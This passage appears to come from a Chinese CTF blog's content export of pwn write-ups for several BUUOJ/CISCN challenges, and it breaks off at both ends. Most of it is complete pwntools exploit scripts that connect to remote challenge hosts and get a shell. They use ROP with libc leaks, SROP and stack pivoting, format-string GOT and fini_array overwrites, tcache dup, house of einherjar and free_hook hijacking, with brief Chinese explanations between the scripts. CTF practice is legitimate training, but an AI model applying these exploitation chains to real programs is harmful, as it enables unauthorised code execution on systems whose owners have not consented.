show(idx):\nsla(menu, \"3\")\nsla(\"Index > \", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\nadd(0,2,0x88,'A'*10)\nadd(1,2,0x38,'A'*10)\nadd(2,1,24,'1')\ndelete(1)\ndelete(2)\n\nadd(3,2,0xc,'dash'+ p32(system_plt))\nadd(4,2,0x38,'BBBB')\npause()\ndelete(1)\np.interactive()\npause()\n```\n\n5.ciscn_2019_n_5：栈溢出，泄露地址ROP。没开NX，shellcode也行。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_n_5\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n'''\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26514\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = elf.sym['main']\n\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n\n#ret = 0x4004c9\n#pop_rdi_ret = 0x400713\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(ret)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\np.interactive()\n```\n\n6.ciscn_s_3：栈溢出，利用SROP，栈迁移，常规getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_s_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28198\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmain_addr = elf.sym['main']\ngadget_rax_0xf = 0x4004DA\nsyscall_addr = 0x400517\n\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p64(main_addr)\np.sendline(payload1)\nstack_addr = u64(rc(0x30)[32:40].ljust(8,'\\x00'))\nlog.info(\"stack_addr:0x%x\"%stack_addr)\n\nbinsh_addr = 0x601030\n\nframe_read = SigreturnFrame() #设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = binsh_addr\nframe_read.rdx = 0xf\nframe_read.rsp = stack_addr-280 + 0xf8\nframe_read.rip = syscall_addr\n\nlog.info(\"frame_read_addr:0x%x\"%(stack_addr-280))\n\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = binsh_addr\nframe_execve.rip = syscall_addr\n\npayload2 = \"\"\npayload2 += \"A\"*0x10\npayload2 += p64(gadget_rax_0xf)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_read)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_execve)\npause()\np.sendline(payload2)\npause()\np.sendline(\"/bin/sh\\x00\".ljust(0xf,'A'))\np.interactive()\n```\n\n▲需要注意的是：\n\nsyscall一般后面都有ret，所以在sigreturn_frame之后如果还需要调用其他的sigreturn_frame或者其他函数，都是需要在上一个sigreturn_frame中设置rsp，使得ret正常执行。\n\n①如果下一步还是sigreturn_frame，则将上一个的rsp设置为指向syscall_ret_addr的栈地址。\n\n②如果下一步是其他函数，则需设置对应指向函数地址的栈地址。\n\n(而以上的设置通常需要结合栈劫持来操作，数据可控比较方便，不用还得从原始栈上找对应的函数地址或者syscall_ret_addr)\n\n \n\n \n\n \n","tags":["刷题"],"categories":["PWN"]},{"title":"CISCN-BUU刷题记录3","url":"/2021/08/14/CISCN-BUU刷题记录3/","content":"\n1.ciscn_final_5：由于题目本身原因，chunkList中存放的堆地址是chunk_addr+idx，所以idx为16时就会导致存放的堆地址为chunk_addr+0x10。同时放入chunkList的顺序是按照申请顺序放入的，删除和修改的时候也是通过遍历查找的。那么如果先申请索引为16，1的chunk，chunkList中就会如下：\n\nchunk16_addr+0x10,chunk1_addr\n\n如果这时候释放索引为0的Chunk，就会误以为chunk16_addr+0x10为索引为0的chunk，如果事先伪造了chunk16_addr+0x10的size域，那么就能够将其释放，再申请回来，那么我们就能够制造堆块重叠，有了堆块重叠加上edit功能就很随意了。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_5\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28635\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"your choice: \"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index: \", str(idx))\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \", con)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nfree_got = elf.got['free']\n__stack_chk_fail_got = elf.got['__stack_chk_fail']\n\nadd(16,0x10,p64(0x0)+p64(0x210))\nadd(1,0x10,p64(free_got))\nadd(2,0x20,p64(free_got))\nadd(3,0x30,p64(free_got))\nadd(4,0x40,p64(free_got))\n\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\n\nadd(5,0x200,p64(0x0)+p64(0x21)+p64(free_got))\nadd(6,0x10,\"Free\")\nadd(7,0x10,p64(puts_plt))\n\nedit(5,p64(0x0)+p64(0x21)+\np64(0x0)*0x3+p64(0x31)+\np64(__stack_chk_fail_got))\nadd(8,0x20,p64(__stack_chk_fail_got))\nadd(9,0x20,\"a\")\ndelete(9)\n\nlibc_base = u64(rc(6).ljust(8, '\\x00'))-libc.sym['puts']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym['system']\n\nedit(5,p64(0x0)+p64(0x21)+p64(0x0)*10+p64(free_got))\nadd(10,0x30,p64(free_got))\nadd(11,0x30,p64(system_addr))\nadd(12,0x60,\"/bin/sh\\x00\")\ndelete(12)\np.interactive()\n```\n\n这里需要注意一点的是，我的做法不像其他人申请chunk到chunkList直接控制chunk块，从而修改堆块地址传入到被劫持为puts函数的free_got来泄露地址，而是直接申请到got表上，将got表作为堆地址传入被劫持为puts函数的free_got来泄露got表中的地址。\n\n但是这里会遇到一个问题，就是选择哪一个函数的got表作为堆地址。这里两种解决办法：\n\n(1)可以发送size为0，那么就不会修改到函数的got表，但是这个方法要求利用0x20的tcache的dup。\n\n(2)如果size不为0，那么申请堆块的时候势必要发送数据，最少也是\\x0a。那么发送数据也肯定会修改到该函数的真实地址，那么泄露出来的就是修改后的真实地址，而且如果该函数在程序运行过程中容易被调用，那么修改之后也势必会使得程序崩溃。这里有Libc文件还好，可以直接查找libc文件对于函数的最后一个字节来修复一下，但如果没有libc文件，那么就没招了。\n\n这里假设没有libc文件，那么我们就需要找一个不太能用到函数来修改，这里刚好有个__stack_chk_fail_，只要不触发canary，这个函数就不会被调用，其got表是延迟绑定的，保存的不是真实地址，直接拿来用就行。同时还要注意的是由于是__stack_chk_fail_的got表作为堆地址，但是实际传入给puts函数的地址是__stack_chk_fail_got-0x10，所以泄露出来的是对应的puts函数的真实地址。\n\n之后就正常利用0x20,0x30,0x40的tcache来任意申请修改了。\n\n2.ciscn_2019_en_3：水题，利用格式化字符串泄露地址，打free_hook，唯一需要注意的一点是程序本身的提示信息，注意空格和DEBUG的使用。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_en_3\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25412\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Input your choice:\"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"Please input the size of story: \\n\", str(size))\n    sa(\"please inpute the story: \\n\", con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n\nsla(\"Please input the index:\\n\", str(idx))\nsla(\"What's your name?\\n\",\"%p.%p\")\nru(\".0x\")\nread_addr = int(rc(12),16)-0x11\nobj = LibcSearcher(\"read\", read_addr)\nlibc_base = read_addr-obj.dump('read')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nfree_hook = libc_base + obj.dump('__free_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nsla(\"Please input your ID.\\n\",\"A\")\nadd(0x18,p64(free_hook))\nadd(0x18,\"/bin/sh\\x00\")\ndelete(0)\ndelete(0)\nadd(0x18,p64(free_hook))\nadd(0x18,p64(free_hook))\nadd(0x18,p64(system_addr))\ndelete(1)\np.interactive()\n```\n\n3.ciscn_2019_s_6：水到家的题，懒得看，两分钟改完脚本拉倒。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_6\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\np = process(binary)\n#p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"25301\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size,name,call):\n    p.recvuntil('choice:')\n    p.sendline('1')\n    p.recvuntil('name')\n    p.sendline(str(size))\n    p.recvuntil('name:')\n    p.sendline(name)\n    p.recvuntil('call:')\n    p.sendline(call)\n\ndef show(idx):\n    p.recvuntil('choice:')\n    p.sendline('2')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\ndef delete(idx):\n    p.recvuntil('choice:')\n    p.sendline('3')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\nadd(0x88,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nfor i in range(7):\n    delete(0)\n\ndelete(0)\nshow(0)\np.recvuntil('name')\nmain_arena=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-96\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nfree_hook = libc_base + obj.dump(\"__free_hook\")\nsystem_addr = libc_base + obj.dump(\"system\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\n#p.recvuntil()\ndelete(1)\ndelete(1)\ndelete(1)\n\nadd(0x20,p64(free_hook),'pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,p64(system_addr),'pppp')\nadd(0x20,'/bin/sh\\x00','pppp')\n\ndelete(6)\np.interactive()\n```\n\n4.ciscn_2019_sw_1：格式化字符串，改fini_array为main_addr，使得程序循环再来一次，劫持printf为system_plt，再输入binsh即可getshell。程序里的sys没啥用，用来迷惑人的，因为command无法被修改。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_2019_sw_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27341\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nfini_array = 0x0804979C\nprintf_got = elf.got['printf']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\n\npayload = \"\"\npayload += p32(fini_array+2)\npayload += p32(fini_array)\npayload += p32(printf_got+2)\npayload += p32(printf_got)\npayload += '%'+str(0x0804-0x10)+'c'+'%4$hn'\npayload += '%'+str(int(main_addr&0xffff)-0x0804)+'c'+'%5$hn'\npayload += '%'+str(0x10804-int(main_addr&0xffff))+'c'+'%6$hn'\npayload += '%'+str(int(system_plt&0xffff)+0x10000-0x10804)+'c'+'%7$hn'\n\n\npause()\np.sendline(payload)\npause()\np.sendline(\"/bin/sh\\x00\")\npause()\np.interactive()\n```\n\n5.ciscn_2019_s_1：差点被这道题搞崩溃。网上解法太多，感觉都挺麻烦的。其实直接一个技巧就搞定：house_of_einherjar。进行一定堆布局，申请chunk8-chunk10，将0x100的tcache填满，在chunk8中伪造chunk，满足2.27下的unlink要求，即size位和fd,bk位。(由于这里给了堆地址，所以可以直接用，恰好能够满足要求)之后触发0x100的off-by-null向上合并，将chunk9给overlap，之后申请到tcache结构体，就能随便玩了。(house_of_einherjar重点在于2.27下的unlink)\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\np = process(binary)\n#p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"26685\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"4.show\\n\"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index:\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    ru(\"gift: \")\n    chunk_addr = int(ru(\"\\n\"),16)\n    sa(\"content:\\n\", con)\n    return chunk_addr\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"4\")\n    sla(\"index:\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n    sa(\"content:\\n\", con)\n\nkey_addr = 0x6022B8\n\nchunk0_addr = add(0,0xf8,\"0\")\nheap_base = chunk0_addr-0x260\n\nchunk8_addr = add(8,0xf8,\"8\")\nchunk9_addr = add(9,0xe8,\"9\")\nchunk10_addr = add(10,0xf8,\"10\")\nlog.info(\"chunk8_addr:0x%x\"%chunk8_addr)\nlog.info(\"chunk9_addr:0x%x\"%chunk9_addr)\nlog.info(\"chunk10_addr:0x%x\"%chunk10_addr)\n\nedit(8,p64(0x110)+p64(0xf1+0xf0)+\np64(chunk8_addr)+p64(chunk8_addr))\nedit(9,\"9\"*0xe0+\np64(0xf0+0xf0))\n\nfor i in range(0,7):\n    add(i+1,0xf8,\"X\"*0xf7)\nfor i in range(0,7):\n    delete(i+1)\n\ndelete(9)\ndelete(10)\nchunkA_addr = add(9,0xd0,\"9\")\nchunkB_addr = add(10,0xd0,\np64(0x0)+p64(0xf0)+\np64(heap_base+0x10)+p64(heap_base+0x10))\nunsortedbin_addr = chunk8_addr+0x10+0xe0+0xe0\n\nadd(11,0xe8,p64(heap_base+0x10))\nadd(12,0xe8,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(0x0)+ #0xa0\np64(unsortedbin_addr-0x10)+ #0xb0\np64(heap_base+0x10)) #0xc0\n\nadd(13,0x88,p64(0x1))\nadd(14,0xa0,\"A\"*0x10)\nshow(14)\nru(\"AAAAAAAAAAAAAAAA\")\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\") #system\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\nedit(12,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(free_hook_addr)+ #0xa0\np64(unsortedbin_addr-0x10)) #0xc0\n\nadd(15,0x98,p64(system_addr))\nadd(16,0xf0,\"/bin/sh\\x00\")\n\ndelete(16)\np.interactive()\n```\n\n \n","tags":["刷题"],"categories":["PWN"]},{"title":"CISCN2021线上复现","url":"/2021/08/14/CISCN2021线上复现/","content":"\n一.lonelywolf：UAF，show函数也可以泄露释放后的堆块。\n\n1.思路：\n\n(1)由于在edit的时候先是创建了一个新变量，然后依据size来从变量中获取数据拷贝到chunk中，所以最后补0其实没办法造成off by null。\n\n(2)申请0x8大小的堆块，释放后修改数据，连上放入tcache之后被赋值的bk，show一下，泄露出堆地址。\n\n(3)申请最大size的chunk，0x78，delete之后改掉fd指向heap_base，获得tcache结构体的控制权，0-0x40为大小，0x40-0x78为bin链，可控0x20,0x30,0x40,0x50,0x60,0x70,0x80的bin链。\n\n(4)之后就随意了，控bin链和bin大小，将任意一个bin大小的count改成7，伪造满tcache，之后释放一个chunk即可进入unsortedbin中，show一下得到Libc地址。\n\n(5)再控tcache结构体，直接得到malloc_hook的chunk，改为One_gadget，再申请一下chunk即可getshell。\n\n2.exp\n\n```\n#注释头\n\nfrom pwn import *\n#context.log_level = 'debug'\nlocal = 0\nif local:\np = 